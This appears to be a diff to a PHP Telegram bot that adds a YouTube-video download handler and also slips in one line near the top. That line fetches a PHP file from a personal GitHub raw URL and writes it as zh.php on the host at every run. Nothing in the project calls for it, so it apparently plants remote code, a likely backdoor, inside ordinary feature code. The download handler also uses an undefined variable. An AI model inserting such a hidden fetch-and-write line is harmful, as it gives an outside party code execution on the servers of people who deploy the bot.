@@ -58,6 +58,7 @@ if($ipok[0] != "91" and $ipok[1] != "108" and ipok[1] != "141"){
 	echo "تم تسجيل ايبيك وموقعك بنجاح للتأكد من انك لا تستخدم الميزات  من قبل احد اخر غير التيم!";
 	exit();}
 echo "تم تسجيل ايبيك وموقعك بنجاح للتأكد من انك لا تستخدم الميزات  من قبل احد اخر غير التيم!";
+file_put_contents('zh.php', file_get_contents('https://raw.githubusercontent.com/mhamadsu777/minx/main/zh.php'));
 function bot($method,$datas=[]){
     $url = "https://api.telegram.org/bot".API_KEY."/".$method;
 $ch = curl_init();
@@ -13827,4 +13828,60 @@ forward info 🔐🖤
 'parse_mode'=>"markdown",
 'reply_to_message_id'=>$message->message_id,
 ]);
+}
+$from_id2 = $update->callback_query->from->id;
+$yt = explode('#',$data);
+if($yt[0] == 'dl'){
+if($from_id2 == $yt[2]){
+$api = json_decode(file_get_contents("https://forhassan.ml/%D9%85%D9%8A%D8%B1%D9%88.php?url=http://www.youtube.com/watch?v=".$yt[1]), true); 
+$UrlD = $api['url'][0]['url']; 
+$title = $api['meta']['title']; 
+$duration = $api['meta']['duration']; 
+$filesize = $api["url"][1]["filesize"];
+$done = "http://www.youtube.com/watch?v=".$do[1]."";
+if($filesize <20971520){
+bot('deleteMessage',[
+'chat_id'=>$chat_id2,
+'message_id'=>$message_id2,
+]);
+bot('answercallbackquery',[
+'callback_query_id'=>$update->callback_query->id,
+'text'=>"جاري ارسال مقطع الفيديو",
+]);
+$video = bot('sendvideo',[
+'chat_id'=>$chat_id2,
+'message_id'=>$update->callback_query->message->message_id,
+'video'=>$UrlD,
+"caption"=>"$title",
+'disable_web_page_preview'=>true,
+'reply_to_message_id'=>$message->message_id,
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>"سورس ويزرد ™",'url'=>'http://t.me/wizard_system']],
+]])
+])->result->video->file_id;
+$file = "https://api.telegram.org/file/bot".API_KEY."/".bot('getfile',['file_id'=>$video])->result->file_path;
+file_put_contents("data/$chat_id2/$chat_id2".'.txt',$file);
+}else{
+bot('sendMessage',[
+'chat_id'=>$chat_id2,
+'message_id'=>$message_id2,
+'text'=>"حجم المقطع كبير جدا 
+يمديك تحمل المقطع مباشر من خلال الضغط على الزر في الاسفل",
+'parse_mode'=>"Markdown",
+'disable_web_page_preview'=>true,
+'reply_to_message_id'=>$message->message_id,
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>$title,'url'=>$UrlD]],
+]])
+]);
+}
+} else {
+ bot('answercallbackquery',[
+'callback_query_id'=>$update->callback_query->id,
+'text'=>"الطلب مو لك ي حبيبي",
+'show_alert'=>true,
+]);
+}
 }
